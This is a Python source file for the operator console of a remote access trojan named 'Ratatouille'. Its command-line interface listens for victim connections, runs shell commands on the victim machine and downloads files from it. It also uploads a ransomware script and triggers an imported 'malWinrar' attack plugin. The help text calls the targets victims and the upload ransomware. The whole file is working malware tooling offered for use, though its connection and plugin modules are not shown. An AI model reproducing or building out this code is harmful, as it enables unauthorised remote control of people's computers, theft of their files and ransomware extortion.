# aqui estará un server demo 
# demo connection se encargará de la conexión del cliente al servidor 
from resources.connection import Connection
import cmd 
from colorama import Fore,Style
import plugins.malWinrar as malrar

class Server(cmd.Cmd):
    server = Connection()
    ipaddr=""
    port=""
    intro=Fore.BLUE+'''
 ███████████     █████████   ███████████   █████████   ███████████    ███████    █████  █████ █████ █████       █████       ██████████
░░███░░░░░███   ███░░░░░███ ░█░░░███░░░█  ███░░░░░███ ░█░░░███░░░█  ███░░░░░███ ░░███  ░░███ ░░███ ░░███       ░░███       ░░███░░░░░█
 ░███    ░███  ░███    ░███ ░   ░███  ░  ░███    ░███ ░   ░███  ░  ███     ░░███ ░███   ░███  ░███  ░███        ░███        ░███  █ ░ 
 ░██████████   ░███████████     ░███     ░███████████     ░███    ░███      ░███ ░███   ░███  ░███  ░███        ░███        ░██████   
 ░███░░░░░███  ░███░░░░░███     ░███     ░███░░░░░███     ░███    ░███      ░███ ░███   ░███  ░███  ░███        ░███        ░███░░█   
 ░███    ░███  ░███    ░███     ░███     ░███    ░███     ░███    ░░███     ███  ░███   ░███  ░███  ░███      █ ░███      █ ░███ ░   █
 █████   █████ █████   █████    █████    █████   █████    █████    ░░░███████░   ░░████████   █████ ███████████ ███████████ ██████████
░░░░░   ░░░░░ ░░░░░   ░░░░░    ░░░░░    ░░░░░   ░░░░░    ░░░░░       ░░░░░░░      ░░░░░░░░   ░░░░░ ░░░░░░░░░░░ ░░░░░░░░░░░ ░░░░░░░░░░ 
                                                          
'''+Fore.LIGHTMAGENTA_EX+'''Autor: Anthony aka D34dy_p00l                                               

'''
    prompt= Fore.LIGHTBLUE_EX+"(Ratatouille🐀) -> "
    #---------------------Commands----------------------------
    def do_exit(self,line):
        print(Fore.BLUE+'Chau!')
        
        print(Style.RESET_ALL) 
        return True
    def do_run(self,line):
        try:
            lcommnad=self.command = input("(CMD)-> ")
            self.server.run_command(lcommnad)
        except:
            print(Fore.RED+"[x] Ocurrio Un error.")
           
        

    def do_listen(self,line):
        print(Fore.GREEN+"🍳 Socket Created.")
        print(Fore.GREEN+"🍳 Waiting for connections...")
        try: 
            self.server.conecting()
            self.ipaddr = self.server.addr[0]
            self.port=self.server.addr[1]
        except:
            print(Fore.RED+"[x] Ocurrio Un error.")
                

    def do_victims(self,line):
        print("--------------------Victimas----------------------------------")
        print(Fore.GREEN+f"🧀 IP Address: {self.ipaddr:12}| Port: {self.port}")
    
    def do_uploadRansom(self,line):
        self.server.upload_file()
        
    def do_download(self,line):
        fPath= input(Fore.YELLOW+"[Path]-> ").encode()
        outf=input(Fore.YELLOW+"[outFile]-> ")
        try:
            if outf == "":
                self.server.download_file(fPath)
            else:
                self.server.download_file(fPath,outf)
        except KeyboardInterrupt :
            print("")
        except:
            print(Fore.RED+"[x] Ocurrio Un error.")

    def do_malWinrar(self,line):
        rar=malrar.MalWinrar()
        rar.correrAtaque()
        


    


    #-----------------------Help------------------------------

    def help_run(self):
        print("[?] Ejecuta comando una vez ya se haya establecido la conexión con la maquina víctima.")
    def help_listen(self):
        print("[?] Escucha nuevas conexiones mediante el puerto 8080.")
    def help_download(self):
        print("[?] Descarga archivos desde la ruta provista.")

    def help_uploadRansom(self):
        print("[?] Envía archivo .py (Ransomware) al equipo víctima.")

    def help_screenshot(self):
        print("[?] Toma una screenshot de la ventana actual de la víctima.")


try:
    Server().cmdloop()
except KeyboardInterrupt :
    print(Style.RESET_ALL) 